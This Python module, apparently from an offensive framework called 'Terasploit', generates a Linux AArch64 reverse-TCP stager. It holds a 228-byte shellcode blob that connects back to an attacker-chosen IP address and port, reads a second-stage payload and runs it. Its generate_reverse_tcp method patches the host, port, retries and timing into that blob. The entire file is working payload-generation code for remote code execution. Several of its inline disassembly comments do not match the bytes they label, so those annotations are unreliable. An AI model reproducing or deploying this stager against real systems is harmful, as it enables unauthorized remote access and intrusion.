"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            teralibs/tsf/core/payload/linux/aarch64/reverse_tcp.py
"""

import socket
import struct

from teralibs.tsf.core.payload.linux.aarch64.prepends import LinuxAarch64Prepends


class ReverseTcpAarch64(LinuxAarch64Prepends):
    """
    Mixin that provides Linux AArch64 reverse-TCP stager generation.
    Configures a pre-compiled shellcode blob with user-supplied options.
    """

    # The 228-byte pre-compiled shellcode blob.
    # Offsets are identified based on the provided AArch64 instruction sequence.
    SHELLCODE_BLOB = (
        b"\x40\x00\x80\xd2"  # movz x0, #0
        b"\x00\x00\x80\xd2"  # [Offset 4]   Patch: read_length (x1)
        b"\x02\x00\x80\xd2"  # movz x2, #7
        b"\xc8\x18\x80\xd2"  # movz x8, #222
        b"\x01\x00\x00\xd4"  # svc #0
        b"\xec\x03\x00\xaa"  # mov x12, x0
        b"\x21\x06\x00\x10"  # adr x1, sockaddr
        b"\x02\x02\x80\xd2"  # movz x2, #257
        b"\x68\x19\x80\xd2"  # movz x8, #198
        b"\x01\x00\x00\xd4"  # svc #0
        b"\x40\x05\x00\x35"  # cbnz x0, fail
        b"\xe0\x03\x0c\xaa\xff\x43\x00\xd1\xe1\x03\x00\x91\x82\x00\x80\xd2"
        b"\xe8\x07\x80\xd2\x01\x00\x00\xd4\x1f\x04\x00\xb1\x40\x04\x00\x54"
        b"\xe2\x03\x40\xb9\x42\xfc\x4c\xd3\x42\x04\x00\x91\x42\xcc\x74\xd3"
        b"\xe0\x03\x1f\xaa\xe1\x03\x02\xaa\xe2\x00\x80\xd2"
        b"\x00\x00\x80\xd2"  # [Offset 100] Patch: retry_count (x3)
        b"\xe4\x03\x1f\xaa\xe5\x03\x1f\xaa\xc8\x1b\x80\xd2\x01\x00\x00\xd4"
        b"\x1f\x04\x00\xb1\x80\x02\x00\x54\xe4\x03\x40\xb9\xe0\x03\x00\xf9"
        b"\xe3\x03\x00\xaa\xe0\x03\x0c\xaa\xe1\x03\x03\xaa\xe2\x03\x04\xaa"
        b"\xe8\x07\x80\xd2\x01\x00\x00\xd4\x1f\x04\x00\xb1\x40\x01\x00\x54"
        b"\xe2\x03\x00\xaa"
        b"\x00\x00\x80\xd2"  # [Offset 180] Patch: sleep_seconds (x8)
        b"\x01\x00\x00\xd4\xe0\x03\x02\xaa\x63\x00\x00\x8b\x84\x00\x00\xeb"
        b"\x61\xfe\xff\x54\xe0\x03\x40\xf9\x00\x00\x3f\xd6\x00\x00\x80\xd2"
        b"\xa8\x0b\x80\xd2\x01\x00\x00\xd4"
        b"\x02\x00"  # AF_INET family
        b"\x00\x00"  # [Offset 222] Patch: Port
        b"\x00\x00\x00\x00"  # [Offset 224] Patch: IP Address
    )

    def _encode_movz_x(self, reg, imm):
        """Helper to encode an AArch64 MOVZ instruction word."""
        # 0xD2800000 is the base opcode for MOVZ (sf=1, shift=0)
        instruction = 0xD2800000 | ((imm & 0xFFFF) << 5) | (reg & 0x1F)
        return struct.pack("<I", instruction)

    def generate_reverse_tcp(
        self,
        *,
        host_option,
        retry_count=5,
        sleep_seconds=5.0,
        read_length=4096,
    ):
        """
        Injects configuration data into the SHELLCODE_BLOB.
        """
        host_ip, port = host_option[0], host_option[1]

        # Working buffer
        buf = bytearray(self.SHELLCODE_BLOB)

        # Patch execution parameters (Instructions)
        buf[4:8] = self._encode_movz_x(1, read_length)
        buf[100:104] = self._encode_movz_x(3, retry_count)
        buf[180:184] = self._encode_movz_x(8, int(sleep_seconds))

        # Patch networking data (Static data at end of blob)
        buf[222:224] = struct.pack(">H", port)
        buf[224:228] = socket.inet_aton(host_ip)

        return bytes(buf)
